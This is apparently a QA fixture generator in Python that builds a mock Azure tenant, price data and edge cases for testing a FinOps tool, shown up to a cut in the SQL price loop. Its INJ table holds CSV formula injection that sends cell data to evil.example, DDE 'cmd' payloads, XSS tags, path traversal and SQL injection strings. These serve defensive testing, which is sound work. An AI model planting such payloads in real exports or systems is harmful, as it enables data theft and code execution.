#!/usr/bin/env python3
"""
mock-azure/generate_mock_azure.py   (v2 — complex)
============================================================
Deterministic mock-Azure tenant for QA of the FinOps tool.

Reproducible: a fixed seed (20260930) drives every bulk value, so two runs
produce byte-identical files. No network, no credentials, not real tenant data.

Artifacts
  1. azure_subscriptions.json          SubscriptionClient.subscriptions.list()
  2. azure_resources_raw.json          ResourceManagementClient.resources.list()
                                       raw ARM shape incl. tags/zones/identity,
                                       nested Sql parents+children
  3. azure_prices.json                 retail-price Items keyed by the EXACT
                                       OData filter pricing.py builds
  4. azure_resources_normalized.csv    extractor output == valid --input CSV
  5. resources_extended.yaml           config exercising 14 resource types
                                       (the shipped config enables 5)
============================================================
"""

import csv
import json
import random
from collections import Counter
from pathlib import Path

HERE = Path(__file__).resolve().parent
SEED = 20260930
RNG = random.Random(SEED)

NDF = "NDF"

# ── Tenancy ────────────────────────────────────────────────────────────────
# 8 subscriptions across 2 management groups. One is Disabled on purpose.

MGS = {
    "Platform": "mg-platform-0001",
    "Workloads": "mg-workloads-0002",
}

SUBSCRIPTIONS = [
    ("sub-a1b2c3d4-1111-4a2b-9c3d-000000000001", "Contoso Production",        "Enabled",  "Workloads"),
    ("sub-e5f6a7b8-2222-4c3d-8e4f-000000000002", "Contoso Development",       "Enabled",  "Workloads"),
    ("sub-c9d0e1f2-3333-4e5f-a6b7-000000000003", "Contoso Staging",           "Enabled",  "Workloads"),
    ("sub-11223344-4444-4a11-9b22-000000000004", "Contoso Shared Services",   "Enabled",  "Platform"),
    ("sub-55667788-5555-4b22-8c33-000000000005", "Contoso Data Platform",     "Enabled",  "Platform"),
    ("sub-99aabbcc-6666-4c33-9d44-000000000006", "Contoso Identity",          "Enabled",  "Platform"),
    ("sub-ddeeff00-7777-4d44-a055-000000000007", "Contoso Sandbox",           "Enabled",  "Workloads"),
    ("sub-13579bdf-8888-4e55-b166-000000000008", "Contoso Legacy (Cancelled)", "Disabled", "Workloads"),
]

ENABLED = [s for s in SUBSCRIPTIONS if s[2] == "Enabled"]

REGIONS = [
    "eastus", "eastus2", "westus", "westus2", "westus3", "centralus",
    "northeurope", "westeurope", "uksouth", "germanywestcentral",
    "southeastasia", "japaneast", "australiaeast", "brazilsouth",
    "uaenorth", "southafricanorth",
]

VM_SIZES = [
    "Standard_B1s", "Standard_B2s", "Standard_B2ms", "Standard_D2s_v3",
    "Standard_D4s_v5", "Standard_D8s_v5", "Standard_E4s_v3", "Standard_E8s_v3",
    "Standard_F2s_v2", "Standard_F4s_v2", "Standard_NC6s_v3",
    "Standard_M128s_v2", "Standard_L8s_v3",
]
STORAGE_SKUS = [
    "Standard_LRS", "Standard_ZRS", "Standard_GRS", "Standard_RAGRS",
    "Standard_GZRS", "Premium_LRS", "Premium_ZRS", "PremiumV2_LRS",
]
ASP_SKUS = ["B1", "B2", "B3", "S1", "S2", "S3", "P0v3", "P1v2", "P2v3", "P3v3", "I1v2", "I2v3"]
SQL_SKUS = ["Standard", "GeneralPurpose", "BusinessCritical", "Hyperscale", "Serverless"]
APPS = ["web", "api", "worker", "batch", "etl", "portal", "auth", "report", "search", "iot"]
ENVS = ["prod", "dev", "stage", "shared", "sandbox"]

# ── Tag vocabulary (FinOps reality: this is what showback depends on) ──────
COST_CENTERS = ["CC-1001", "CC-2043", "CC-3310", "CC-4488", "CC-5501", "CC-6690"]


def tags(env, owner, **extra):
    t = {
        "environment": env,
        "costCenter": RNG.choice(COST_CENTERS),
        "owner": owner,
        "managedBy": "terraform",
        "createdDate": f"2025-{RNG.randint(1,12):02d}-{RNG.randint(1,28):02d}",
    }
    t.update(extra)
    return t


# ── ARM resource builder ───────────────────────────────────────────────────
def arm(sub, mg, rg, name, rtype, location, sku_name="", sku_tier="", vm_size="",
        tg=None, kind=None, zones=None, identity=None, props=None, parent_name=None):
    # A nested type is addressed through its parent in the ARM id path, so the
    # parent segment sits between the parent type and the child type:
    #
    #   type = Microsoft.Sql/servers/databases, parent_name = sql-prod-ecom,
    #   name = maindb
    #     -> /providers/Microsoft.Sql/servers/sql-prod-ecom/databases/maindb
    #
    # Flattening it to /providers/Microsoft.Sql/servers/databases/maindb would
    # produce an id that does not exist in Azure and that no parent id prefixes.
    if parent_name and rtype.count("/") >= 2:
        namespace, parent_segment, *rest = rtype.split("/")
        path = f"{namespace}/{parent_segment}/{parent_name}/{'/'.join(rest)}"
    else:
        path = rtype

    r = {
        "id": f"/subscriptions/{sub}/resourceGroups/{rg}/providers/{path}/{name}",
        "name": name,
        "type": rtype,
        "location": location,
        "resourceGroup": rg,
        "managedBy": mg,
        "tags": tg if tg is not None else {},
        "sku": ({"name": sku_name, "tier": sku_tier} if (sku_name or sku_tier) else None),
        "properties": dict(props or {}),
    }
    if vm_size:
        r["properties"]["hardwareProfile"] = {"vmSize": vm_size}
    if kind:
        r["kind"] = kind
    if zones:
        r["zones"] = zones
    if identity:
        r["identity"] = identity
    return r


# ══════════════════════════════════════════════════════════════════════════
# HAND-CRAFTED FIXTURES (the interesting ones)
# ══════════════════════════════════════════════════════════════════════════

SUB_A, SUB_B, SUB_C, SUB_D, SUB_E, SUB_F, SUB_G, SUB_H = [s[0] for s in SUBSCRIPTIONS]
NAME_OF = {s[0]: s[1] for s in SUBSCRIPTIONS}

# Payloads. Every one of these lands in a cell that the tool writes to CSV.
INJ = {
    "formula_hyperlink": '=HYPERLINK("http://evil.example/x?d="&A1,"click me")',
    "formula_cmd": "=cmd|'/c calc'!A1",
    "dde_payload": "=1+1+cmd|' /C calc'!A0",
    "plus_prefix": "+HYPERLINK(\"http://evil.example/\",\"x\")",
    "minus_prefix": "-2+3+cmd|' /C calc'!A0",
    "at_prefix": "@SUM(1+1)*cmd|'/c calc'!A0",
    "tab_prefix": "\t=1+1",
    "cr_prefix": "\r=1+1",
    "html_img": '\"><img src=x onerror=alert(1)>',
    "script_tag": "<script>alert(1)</script>",
    "traversal": "../../../../etc/passwd",
    "nullbyte": "vm-stage-null\x00byte",
    "newline": "vm-multi\nline-name",
    "comma": "vm-with,comma-and-\"quote\"",
    "bidi": "vm-\u202egnirts-etelpmis\u202c",      # RTL override: visual spoof
    "homoglyph": "v\u043c-prod-web-01",            # Cyrillic 'м' in "vm"
    "long10k": "vm-" + ("x" * 10000),
    "sql_ish": "vm'; DROP TABLE resources;--",
    "sqli_union": "vm' UNION SELECT * FROM prices--",
    "pathlike": "..\\..\\windows\\system32\\config",
    "emoji": "vm-🚀-prod-01",
}

HAND_CRAFTED = {sub: {} for sub in NAME_OF}

# ── SUB_A: happy path + the nested-parent duplication bug ──────────────────
HAND_CRAFTED[SUB_A]["Microsoft.Compute/virtualMachines"] = [
    arm(SUB_A, "Workloads", "rg-prod-compute", "vm-prod-web-01", "Microsoft.Compute/virtualMachines", "eastus",
        vm_size="Standard_D2s_v3", tg=tags("prod", "platform@contoso.example")),
    arm(SUB_A, "Workloads", "rg-prod-compute", "vm-prod-web-02", "Microsoft.Compute/virtualMachines", "eastus",
        vm_size="Standard_D2s_v3", tg=tags("prod", "platform@contoso.example"), zones=["1"]),
    arm(SUB_A, "Workloads", "rg-prod-compute", "vm-prod-api-01", "Microsoft.Compute/virtualMachines", "eastus",
        vm_size="Standard_E4s_v3", tg=tags("prod", "api-team@contoso.example"),
        identity={"type": "SystemAssigned", "principalId": "00000000-0000-0000-0000-000000000000"}),
    # Stopped/deallocated VMs are invisible in ARM resource data — still billed 730h
    arm(SUB_A, "Workloads", "rg-prod-compute", "vm-prod-bastion", "Microsoft.Compute/virtualMachines", "westeurope",
        vm_size="Standard_B2s", tg=tags("prod", "platform@contoso.example", state="deallocated")),
]
HAND_CRAFTED[SUB_A]["Microsoft.Storage/storageAccounts"] = [
    arm(SUB_A, "Workloads", "rg-prod-data", "stprodlogsaudit", "Microsoft.Storage/storageAccounts", "eastus",
        sku_name="Standard_LRS", sku_tier="Standard", kind="StorageV2", tg=tags("prod", "secops@contoso.example")),
    arm(SUB_A, "Workloads", "rg-prod-data", "stprodarchive", "Microsoft.Storage/storageAccounts", "eastus",
        sku_name="Standard_GRS", sku_tier="Standard", kind="StorageV2", tg=tags("prod", "platform@contoso.example")),
    arm(SUB_A, "Workloads", "rg-prod-data", "stprodhighperf", "Microsoft.Storage/storageAccounts", "eastus",
        sku_name="Premium_LRS", sku_tier="Premium", kind="BlockBlobStorage", tg=tags("prod", "data-team@contoso.example")),
    arm(SUB_A, "Workloads", "rg-prod-data", "stprodzrs", "Microsoft.Storage/storageAccounts", "westeurope",
        sku_name="Standard_ZRS", sku_tier="Standard", kind="StorageV2", tg=tags("prod", "platform@contoso.example")),
]
HAND_CRAFTED[SUB_A]["Microsoft.Web/serverFarms"] = [
    arm(SUB_A, "Workloads", "rg-prod-app", "asp-prod-web", "Microsoft.Web/serverFarms", "eastus",
        sku_name="P1v2", sku_tier="PremiumV2", tg=tags("prod", "web-team@contoso.example")),
    arm(SUB_A, "Workloads", "rg-prod-app", "asp-prod-linux", "Microsoft.Web/serverFarms", "eastus",
        sku_name="P1v2", sku_tier="PremiumV2", kind="linux",
        tg=tags("prod", "web-team@contoso.example", os="linux")),  # Windows/Linux price ambiguity
]
HAND_CRAFTED[SUB_A]["Microsoft.Network/virtualNetworks"] = [
    arm(SUB_A, "Workloads", "rg-prod-net", "vnet-prod-hub", "Microsoft.Network/virtualNetworks", "eastus",
        tg=tags("prod", "network@contoso.example")),
    arm(SUB_A, "Workloads", "rg-prod-net", "vnet-prod-spoke1", "Microsoft.Network/virtualNetworks", "eastus",
        tg=tags("prod", "network@contoso.example"), props={"addressSpace": {"addressPrefixes": ["10.1.0.0/16"]}}),
]

# ── TWO SQL servers in the SAME resource group — the nesting bug ───────────
# _list_nested_resources() queries children per RESOURCE GROUP filtered only by
# type, then prefixes them with the CURRENT parent's name. With two parents in
# one RG, every server sees the other's databases: duplicated rows, mis-attributed.
# Ground truth = 3 databases. Expect the extractor to emit 6.
HAND_CRAFTED[SUB_A]["Microsoft.Sql/servers"] = [
    arm(SUB_A, "Workloads", "rg-prod-sql", "sql-prod-ecom", "Microsoft.Sql/servers", "eastus",
        tg=tags("prod", "data-team@contoso.example")),
    arm(SUB_A, "Workloads", "rg-prod-sql", "sql-prod-report", "Microsoft.Sql/servers", "eastus",
        tg=tags("prod", "bi-team@contoso.example")),
]
# Ground truth for nested resources. Each database is listed under the server
# that really owns it, as (name, sku_name, sku_tier).
SQL_GROUND_TRUTH = {
    "rg-prod-sql": {
        "sql-prod-ecom":   [("maindb", "Standard", "Standard"),
                            ("auditdb", "Standard", "Standard")],
        "sql-prod-report": [("dwdb", "Hyperscale", "Hyperscale")],
    }
}

NESTED_TYPE = "Microsoft.Sql/servers/databases"


def sql_databases(sub, rg):
    """Yield (owning_server_name, database_resource) for every database in `rg`.

    The returned resource carries a real ARM id, with the server segment in the
    path, so a parent-id prefix match is possible.
    """
    for server, dbs in SQL_GROUND_TRUTH.get(rg, {}).items():
        for name, sku_name, sku_tier in dbs:
            yield server, arm(sub, "Workloads", rg, name, NESTED_TYPE, "eastus",
                              sku_name=sku_name, sku_tier=sku_tier,
                              parent_name=server)

# ── SUB_B: degraded / missing-attribute cases ─────────────────────────────
HAND_CRAFTED[SUB_B]["Microsoft.Compute/virtualMachines"] = [
    arm(SUB_B, "Workloads", "rg-dev-compute", "vm-dev-web-01", "Microsoft.Compute/virtualMachines", "eastus",
        vm_size="Standard_B2s", tg=tags("dev", "dev@contoso.example")),
    arm(SUB_B, "Workloads", "rg-dev-compute", "vm-dev-scratch", "Microsoft.Compute/virtualMachines", "eastus",
        vm_size="Standard_D4s_v5", tg=tags("dev", "dev@contoso.example")),
    # no hardwareProfile -> size empty -> VM handler returns zero price
    arm(SUB_B, "Workloads", "rg-dev-compute", "vm-dev-nosize", "Microsoft.Compute/virtualMachines", "eastus",
        tg=tags("dev", "dev@contoso.example")),
    # no tags at all -> invisible to every showback report
    arm(SUB_B, "Workloads", "rg-dev-compute", "vm-dev-untagged", "Microsoft.Compute/virtualMachines", "eastus",
        vm_size="Standard_B2s"),
    # region the price API has no rows for -> NDF
    arm(SUB_B, "Workloads", "rg-dev-compute", "vm-dev-exotic-region", "Microsoft.Compute/virtualMachines",
        "southafricanorth", vm_size="Standard_B2s", tg=tags("dev", "dev@contoso.example")),
    # SKU the price API does not know -> NDF
    arm(SUB_B, "Workloads", "rg-dev-compute", "vm-dev-unknown-sku", "Microsoft.Compute/virtualMachines", "eastus",
        vm_size="Standard_ZZ9s_v99", tg=tags("dev", "dev@contoso.example")),
    # mixed-case type: pricing lowercases; exporter/groupby do NOT
    arm(SUB_B, "Workloads", "rg-dev-compute", "vm-dev-casetype", "MICROSOFT.COMPUTE/VIRTUALMACHINES", "eastus",
        vm_size="Standard_B2s", tg=tags("dev", "dev@contoso.example")),
    # duplicate of vm-dev-web-01, same name/RG/location
    arm(SUB_B, "Workloads", "rg-dev-compute", "vm-dev-web-01", "Microsoft.Compute/virtualMachines", "eastus",
        vm_size="Standard_B2s", tg=tags("dev", "dev@contoso.example")),
]
HAND_CRAFTED[SUB_B]["Microsoft.Storage/storageAccounts"] = [
    # no sku block -> pricing silently assumes Standard_LRS
    arm(SUB_B, "Workloads", "rg-dev-data", "stdevscratch", "Microsoft.Storage/storageAccounts", "eastus",
        tg=tags("dev", "dev@contoso.example")),
]
HAND_CRAFTED[SUB_B]["Microsoft.Web/serverFarms"] = [
    arm(SUB_B, "Workloads", "rg-dev-app", "asp-dev-web", "Microsoft.Web/serverFarms", "eastus",
        sku_name="B1", sku_tier="Basic", tg=tags("dev", "dev@contoso.example")),
]
HAND_CRAFTED[SUB_B]["Microsoft.Network/virtualNetworks"] = [
    arm(SUB_B, "Workloads", "rg-dev-net", "vnet-dev-app", "Microsoft.Network/virtualNetworks", "eastus",
        tg=tags("dev", "dev@contoso.example")),
]

# ── SUB_C: the adversarial surface ────────────────────────────────────────
_inj_vms = []
for i, (label, payload) in enumerate(INJ.items()):
    _inj_vms.append(
        arm(SUB_C, "Workloads", "rg-stage-adversarial", f"vm-adv-{label}",
            "Microsoft.Compute/virtualMachines", RNG.choice(REGIONS[:6]),
            vm_size="Standard_B2s", tg=tags("stage", "qa@contoso.example", payload=payload))
    )
# Overwrite a few names with the real payload so the NAME column is hostile
for r, label in zip(_inj_vms, INJ):
    if label in ("formula_hyperlink", "formula_cmd", "dde_payload", "plus_prefix",
                 "minus_prefix", "at_prefix", "tab_prefix", "cr_prefix", "html_img",
                 "script_tag", "traversal", "nullbyte", "newline", "comma", "bidi",
                 "homoglyph", "long10k", "sql_ish", "sqli_union", "pathlike", "emoji"):
        r["name"] = INJ[label]
        r["id"] = (f"/subscriptions/{SUB_C}/resourceGroups/rg-stage-adversarial/"
                   f"providers/Microsoft.Compute/virtualMachines/{r['name']}")

HAND_CRAFTED[SUB_C]["Microsoft.Compute/virtualMachines"] = _inj_vms + [
    # unparseable ID -> resource_group becomes ""
    {**arm(SUB_C, "Workloads", "rg-stage-compute", "vm-stage-orphan",
           "Microsoft.Compute/virtualMachines", "eastus", vm_size="Standard_D2s_v3"),
     "id": f"/subscriptions/{SUB_C}/providers/Microsoft.Compute/virtualMachines/vm-stage-orphan"},
    # missing location -> pricing NDF
    arm(SUB_C, "Workloads", "rg-stage-compute", "vm-stage-noregion",
        "Microsoft.Compute/virtualMachines", "", vm_size="Standard_D2s_v3"),
    # exact duplicate pair
    arm(SUB_C, "Workloads", "rg-stage-compute", "vm-stage-dup",
        "Microsoft.Compute/virtualMachines", "eastus", vm_size="Standard_B2s"),
    arm(SUB_C, "Workloads", "rg-stage-compute", "vm-stage-dup",
        "Microsoft.Compute/virtualMachines", "eastus", vm_size="Standard_B2s"),
]
HAND_CRAFTED[SUB_C]["Microsoft.Storage/storageAccounts"] = [
    arm(SUB_C, "Workloads", "rg-stage-data", "ststage01", "Microsoft.Storage/storageAccounts", "eastus",
        sku_name="Standard_RAGRS", sku_tier="Standard", tg=tags("stage", "qa@contoso.example")),
    # resource literally named "NDF" — collides with the missing-data sentinel
    arm(SUB_C, "Workloads", "rg-stage-data", "NDF", "Microsoft.Storage/storageAccounts", "eastus",
        sku_name="Standard_LRS", sku_tier="Standard", tg=tags("stage", "qa@contoso.example")),
    # tag value that looks like a secret — does anything leak it into the CSV?
    arm(SUB_C, "Workloads", "rg-stage-data", "ststage-secretish", "Microsoft.Storage/storageAccounts", "eastus",
        sku_name="Standard_LRS", sku_tier="Standard",
        tg=tags("stage", "qa@contoso.example",
                connectionString="DefaultEndpointsProtocol=https;AccountKey=FAKE0000000000000000000000000000000000000000000==",
                ownerEmail="alex.fulmini@contoso.example")),
]
HAND_CRAFTED[SUB_C]["Microsoft.Web/serverFarms"] = [
    arm(SUB_C, "Workloads", "rg-stage-app", "asp-stage-web", "Microsoft.Web/serverFarms", "eastus",
        sku_name="S1", sku_tier="Standard", tg=tags("stage", "qa@contoso.example")),
]
HAND_CRAFTED[SUB_C]["Microsoft.Network/virtualNetworks"] = [
    arm(SUB_C, "Workloads", "rg-stage-net", "vnet-stage", "Microsoft.Network/virtualNetworks", "eastus",
        tg=tags("stage", "qa@contoso.example")),
]

# ── SUB_D..G: platform subscriptions, extra types (no price handlers) ─────
for sub, env in ((SUB_D, "shared"), (SUB_E, "shared"), (SUB_F, "shared"), (SUB_G, "sandbox")):
    c = HAND_CRAFTED[sub]
    c["Microsoft.KeyVault/vaults"] = [
        arm(sub, "Platform", f"rg-{env}-sec", f"kv-{env}-secrets", "Microsoft.KeyVault/vaults",
            "eastus", sku_name="standard", sku_tier="Standard",
            tg=tags(env, "secops@contoso.example")),
    ]
    c["Microsoft.Network/publicIPAddresses"] = [
        arm(sub, "Platform", f"rg-{env}-net", f"pip-{env}-{i}", "Microsoft.Network/publicIPAddresses",
            RNG.choice(REGIONS), sku_name="Standard", sku_tier="Regional",
            tg=tags(env, "network@contoso.example"))
        for i in range(1, 4)
    ]
    c["Microsoft.Network/networkInterfaces"] = [
        arm(sub, "Platform", f"rg-{env}-net", f"nic-{env}-{i}", "Microsoft.Network/networkInterfaces",
            RNG.choice(REGIONS), tg=tags(env, "network@contoso.example"))
        for i in range(1, 5)
    ]
    c["Microsoft.ContainerRegistry/registries"] = [
        arm(sub, "Platform", f"rg-{env}-cr", f"cr{env}contoso", "Microsoft.ContainerRegistry/registries",
            RNG.choice(REGIONS), sku_name="Premium", sku_tier="Premium",
            tg=tags(env, "platform@contoso.example")),
    ]
    c["Microsoft.ContainerService/managedClusters"] = [
        arm(sub, "Platform", f"rg-{env}-aks", f"aks-{env}-{i}", "Microsoft.ContainerService/managedClusters",
            RNG.choice(REGIONS), tg=tags(env, "platform@contoso.example"), identity={"type": "SystemAssigned"})
        for i in range(1, 3)
    ]
    c["Microsoft.CognitiveServices/accounts"] = [
        arm(sub, "Platform", f"rg-{env}-ai", f"cog-{env}-openai", "Microsoft.CognitiveServices/accounts",
            RNG.choice(REGIONS), sku_name="S0", sku_tier="Standard", kind="OpenAI",
            tg=tags(env, "ai-team@contoso.example")),
    ]
    c["Microsoft.MachineLearningServices/workspaces"] = [
        arm(sub, "Platform", f"rg-{env}-ai", f"mlw-{env}-train", "Microsoft.MachineLearningServices/workspaces",
            RNG.choice(REGIONS), tg=tags(env, "ai-team@contoso.example")),
    ]
    c["Microsoft.Compute/virtualMachineScaleSets"] = [
        arm(sub, "Platform", f"rg-{env}-vmss", f"vmss-{env}-{i}", "Microsoft.Compute/virtualMachineScaleSets",
            RNG.choice(REGIONS), sku_name="Standard_D4s_v5", sku_tier="Standard",
            tg=tags(env, "platform@contoso.example"),
            props={"virtualMachineProfile": {"hardwareProfile": {"vmSize": "Standard_D4s_v5"}},
                   "sku": {"capacity": 10}})
        for i in range(1, 3)
    ]
    c["Microsoft.Network/applicationGateways"] = [
        arm(sub, "Platform", f"rg-{env}-net", f"agw-{env}", "Microsoft.Network/applicationGateways",
            RNG.choice(REGIONS), sku_name="WAF_v2", sku_tier="WAF_v2",
            tg=tags(env, "network@contoso.example")),
    ]

# ── Bulk fleet generation (deterministic) ─────────────────────────────────
def bulk(sub, mg, env, n_vm, n_st, n_sql, n_asp, n_vnet, n_pip, n_aks):
    c = HAND_CRAFTED.setdefault(sub, {})

    def add(rtype, items):
        c.setdefault(rtype, []).extend(items)

    add("Microsoft.Compute/virtualMachines", [
        arm(sub, mg, f"rg-{env}-compute-{i%4+1}", f"vm-{env}-{RNG.choice(APPS)}-{i:03d}",
            "Microsoft.Compute/virtualMachines", RNG.choice(REGIONS),
            vm_size=RNG.choice(VM_SIZES), tg=tags(env, f"{env}-team@contoso.example"))
        for i in range(1, n_vm + 1)
    ])
    add("Microsoft.Storage/storageAccounts", [
        arm(sub, mg, f"rg-{env}-data-{i%3+1}", f"st{env}{i:03d}",
            "Microsoft.Storage/storageAccounts", RNG.choice(REGIONS),
            sku_name=RNG.choice(STORAGE_SKUS), sku_tier="Standard", kind="StorageV2",
            tg=tags(env, f"{env}-team@contoso.example"))
        for i in range(1, n_st + 1)
    ])
    add("Microsoft.Sql/servers", [
        arm(sub, mg, f"rg-{env}-sql-{i%2+1}", f"sql-{env}-{i:02d}", "Microsoft.Sql/servers",
            RNG.choice(REGIONS), tg=tags(env, f"{env}-team@contoso.example"))
        for i in range(1, n_sql + 1)
    ])
    add("Microsoft.Web/serverFarms", [
        arm(sub, mg, f"rg-{env}-app-{i%2+1}", f"asp-{env}-{i:02d}", "Microsoft.Web/serverFarms",
            RNG.choice(REGIONS), sku_name=RNG.choice(ASP_SKUS), sku_tier="Standard",
            kind=RNG.choice(["windows", "linux", "app,linux"]),
            tg=tags(env, f"{env}-team@contoso.example"))
        for i in range(1, n_asp + 1)
    ])
    add("Microsoft.Network/virtualNetworks", [
        arm(sub, mg, f"rg-{env}-net-{i%2+1}", f"vnet-{env}-{i:02d}", "Microsoft.Network/virtualNetworks",
            RNG.choice(REGIONS), tg=tags(env, "network@contoso.example"))
        for i in range(1, n_vnet + 1)
    ])
    add("Microsoft.Network/publicIPAddresses", [
        arm(sub, mg, f"rg-{env}-net-{i%2+1}", f"pip-{env}-{i:02d}",
            "Microsoft.Network/publicIPAddresses", RNG.choice(REGIONS),
            sku_name="Standard", sku_tier="Regional", tg=tags(env, "network@contoso.example"))
        for i in range(1, n_pip + 1)
    ])
    add("Microsoft.ContainerService/managedClusters", [
        arm(sub, mg, f"rg-{env}-aks-{i%2+1}", f"aks-{env}-{i:02d}",
            "Microsoft.ContainerService/managedClusters", RNG.choice(REGIONS),
            tg=tags(env, "platform@contoso.example"), identity={"type": "SystemAssigned"})
        for i in range(1, n_aks + 1)
    ])


BULK_PLAN = {
    SUB_A: (28, 14, 4, 8, 6, 10, 3),
    SUB_B: (16, 8, 2, 5, 4, 6, 2),
    SUB_C: (12, 6, 2, 4, 3, 4, 1),
    SUB_D: (10, 6, 2, 4, 3, 8, 2),
    SUB_E: (14, 10, 3, 4, 4, 6, 2),
    SUB_F: (6, 4, 1, 2, 2, 4, 1),
    SUB_G: (8, 4, 1, 3, 2, 4, 1),
}
for _sub, _plan in BULK_PLAN.items():
    _mg = dict((s[0], MGS[s[3]]) for s in SUBSCRIPTIONS)[_sub]
    _env = dict((s[0], s[1].split()[-1].lower()) for s in SUBSCRIPTIONS)[_sub]
    bulk(_sub, _mg, _env, *_plan)

# ── Normalise everything the way resources.py would ───────────────────────
def is_nested(rtype):
    return len(rtype.split("/")) > 2


def safe_sku(r):
    sku = r.get("sku") or {}
    return sku.get("name") or "", sku.get("tier") or ""


def safe_size(r):
    try:
        return r["properties"]["hardwareProfile"]["vmSize"] or ""
    except (KeyError, TypeError):
        return ""


def parse_rg(rid):
    parts = rid.lower().split("/")
    try:
        idx = parts.index("resourcegroups")
        return rid.split("/")[idx + 1]
    except (ValueError, IndexError):
        return ""


HDR = ["subscription_id", "subscription_name", "resource_group", "resource_name",
       "resource_type", "location", "sku", "size"]

NORMALIZED = []
RAW = {}
COUNTED = Counter()

# Deterministic fixture: a VM whose price response carries a malformed (string)
# retailPrice. Extraction is perfectly normal; the failure happens in pricing,
# and it must be reproducible end to end.
HAND_CRAFTED[SUB_C].setdefault("Microsoft.Compute/virtualMachines", []).append(
    arm(SUB_C, "Workloads", "rg-stage-compute", "vm-stage-priceglitch",
        "Microsoft.Compute/virtualMachines", "brazilsouth",
        vm_size="Standard_F2s_v2", tg=tags("staging", "qa@contoso.example")))

for sub, name, state, mg in SUBSCRIPTIONS:
    if state != "Enabled":
        RAW[sub] = HAND_CRAFTED.get(sub, {})
        continue

    raw_block = {}
    for rtype, items in HAND_CRAFTED.get(sub, {}).items():
        raw_block[rtype] = items

        if is_nested(rtype):
            # Nested types are handled in the dedicated pass below; nothing
            # is registered under a nested key in HAND_CRAFTED.
            continue

        for r in items:
            sk, st = safe_sku(r)
            size = safe_size(r) or st
            NORMALIZED.append((sub, name, parse_rg(r["id"]), r["name"], rtype,
                               r.get("location") or "", sk, size))
            COUNTED[rtype] += 1

    RAW[sub] = raw_block

# ── Nested types (SQL databases) — separate pass ──────────────────────────
# The extractor enumerates children with a resource-group-scoped query filtered
# by type, then attributes each child to the parent whose ARM id prefixes it.
# The fixture is built the same way, so it reflects what a correct run produces:
# every database once, under the server that actually owns it.

for sub, name, state, mg in SUBSCRIPTIONS:
    if state != "Enabled":
        continue
    parents = HAND_CRAFTED.get(sub, {}).get("Microsoft.Sql/servers", [])
    RAW.setdefault(sub, {})[NESTED_TYPE] = []

    seen_rgs = set()
    for parent in parents:
        prg = parent["resourceGroup"]
        if prg in seen_rgs:
            continue
        seen_rgs.add(prg)
        for server, ch in sql_databases(sub, prg):
            RAW[sub][NESTED_TYPE].append(ch)
            sk, st = safe_sku(ch)
            NORMALIZED.append((sub, name, prg, f"{server}/{ch['name']}", NESTED_TYPE,
                               ch.get("location") or parent.get("location") or "", sk, st))
            COUNTED[NESTED_TYPE] += 1

# Disabled subscription keeps its raw data for the skip test
RAW[SUB_H] = {
    "Microsoft.Compute/virtualMachines": [
        arm(SUB_H, "Workloads", "rg-legacy", "vm-legacy-01", "Microsoft.Compute/virtualMachines",
            "eastus", vm_size="Standard_D2s_v3", tg=tags("prod", "legacy@contoso.example")),
    ],
    "Microsoft.Storage/storageAccounts": [
        arm(SUB_H, "Workloads", "rg-legacy", "stlegacy01", "Microsoft.Storage/storageAccounts",
            "eastus", sku_name="Standard_LRS", sku_tier="Standard"),
    ],
}


# ══════════════════════════════════════════════════════════════════════════
# MOCK RETAIL PRICES — including the traps
# ══════════════════════════════════════════════════════════════════════════

def item(service, sku, meter, region, price, unit="1 Hour", ptype="Consumption", arm_sku="",
         extra=None):
    d = {
        "currencyCode": "USD", "serviceName": service, "skuName": sku, "meterName": meter,
        "armSkuName": arm_sku or sku, "armRegionName": region, "unitOfMeasure": unit,
        "retailPrice": price, "priceType": ptype, "type": "Consumption",
    }
    if extra:
        d.update(extra)
    return d


PRICES = {}
TRAPS = {}


def vm(size, region, price, linux=True):
    key = (f"serviceName eq 'Virtual Machines' and armSkuName eq '{size}' "
           f"and armRegionName eq '{region}' and priceType eq 'Consumption'")
    rows = []
    if linux:
        rows.append(item("Virtual Machines", f"{size} (Linux)", f"{size} Base", region, price, arm_sku=size))
        rows.append(item("Virtual Machines", f"{size} (Windows)", f"{size} Base", region,
                         round(price * 1.4, 4), arm_sku=size))
    else:
        rows.append(item("Virtual Machines", size, f"{size} Base", region, price, arm_sku=size))
    # Spot row: must be filtered out by _pick_best_price
    rows.append(item("Virtual Machines", f"{size} Spot", f"{size} Spot", region,
                     round(price * 0.15, 4), arm_sku=size))
    # Reservation row: must be filtered out (priceType != Consumption)
    rows.append(item("Virtual Machines", size, f"{size} 1 Year", region,
                     round(price * 0.6, 4), ptype="Reservation", arm_sku=size))
    PRICES[key] = rows
    TRAPS[key] = (
        f"3 candidates; Linux metered {price}, Windows metered {round(price*1.4,4)}. "
        f"_pick_best_price takes the LOWEST -> Linux price wins for a Windows fleet "
        f"({price} vs {round(price*1.4,4)}), understating cost by ~29%."
    )


VM_PRICE_TABLE = {
    "Standard_B1s": 0.0104, "Standard_B2s": 0.0416, "Standard_B2ms": 0.0832,
    "Standard_D2s_v3": 0.0960, "Standard_D4s_v5": 0.1920, "Standard_D8s_v5": 0.3840,
    "Standard_E4s_v3": 0.2520, "Standard_E8s_v3": 0.5040, "Standard_F2s_v2": 0.0846,
    "Standard_F4s_v2": 0.1690, "Standard_NC6s_v3": 3.0600, "Standard_M128s_v2": 30.0000,
    "Standard_L8s_v3": 0.6240,
}
for _sz, _p in VM_PRICE_TABLE.items():
    for _rg in REGIONS:
        if _rg == "southafricanorth" and _sz == "Standard_B2s":
            continue  # deliberate gap -> NDF
        vm(_sz, _rg, _p)

# An unknown SKU simply has no rows. Nothing to add.

# Storage
def storage(redundancy, region, price, tier="Standard"):
    key = (f"serviceName eq 'Storage' and skuName eq '{tier} {redundancy}' "
           f"and armRegionName eq '{region}' and priceType eq 'Consumption'")
    PRICES[key] = [
        item("Storage", f"{tier} {redundancy}", "Write Operations", region, 0.05, "10K"),
        item("Storage", f"{tier} {redundancy}", "Data Stored", region, price, "1 GB/Month"),
        item("Storage", f"{tier} {redundancy} Early Delete", "Early Delete", region, 0.01, "1 GB"),
    ]


for _rg in REGIONS:
    storage("LRS", _rg, 0.018); storage("ZRS", _rg, 0.0225)
    storage("GRS", _rg, 0.036); storage("RAGRS", _rg, 0.045)
    storage("GZRS", _rg, 0.055); storage("LRS", _rg, 0.15, tier="Premium")
    storage("ZRS", _rg, 0.185, tier="Premium")

# SQL
for _sku, _p in (("Standard", 0.10), ("GeneralPurpose", 0.2048),
                 ("BusinessCritical", 0.40), ("Hyperscale", 0.275), ("Serverless", 0.00013)):
    for _rg in REGIONS:
